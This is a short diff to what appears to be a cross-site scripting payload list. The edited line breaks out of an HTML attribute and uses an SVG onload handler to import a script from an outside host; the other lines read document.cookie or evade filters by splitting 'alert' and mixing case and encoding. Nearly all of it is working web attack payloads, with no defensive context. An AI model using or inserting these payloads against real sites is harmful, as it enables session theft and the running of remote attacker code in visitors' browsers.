@@ -1,4 +1,4 @@
-<svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
+'"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
 orwa%27\"><svg/onload​=alert(document.cookie)>
 "<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
 <svg/onload=window["al"+"ert"]1337>
